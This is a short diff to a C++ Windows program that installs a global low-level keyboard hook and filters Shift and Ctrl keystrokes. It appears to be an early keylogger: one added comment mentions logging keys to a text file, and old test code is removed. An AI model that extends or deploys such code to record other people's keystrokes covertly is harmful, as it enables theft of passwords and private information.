@@ -29,8 +29,11 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 	is_control_on = handleCTRL();
 
 	//shift handling handling here, we do not need to print anything :)
+
+	//we're gonna have to handle this a differnt way if we're actually going to log anything in a txt...
 	if (!(keyboardStruct->vkCode == 160 || keyboardStruct->vkCode == 161))
 	{
+		//CTRL handling here.
 		if (!(keyboardStruct->vkCode == 162 || keyboardStruct->vkCode == 163))
 		{
 			if (wparam == WM_KEYDOWN)
@@ -56,9 +59,7 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 int main()
 {
 #if test
-	std::string teststr = "something";
-	teststr.erase(teststr.size() - 1);
-	std::cout << teststr;
+	
 #else
 	handle_to_hook = SetWindowsHookExA(WH_KEYBOARD_LL, proc, NULL, 0);
 
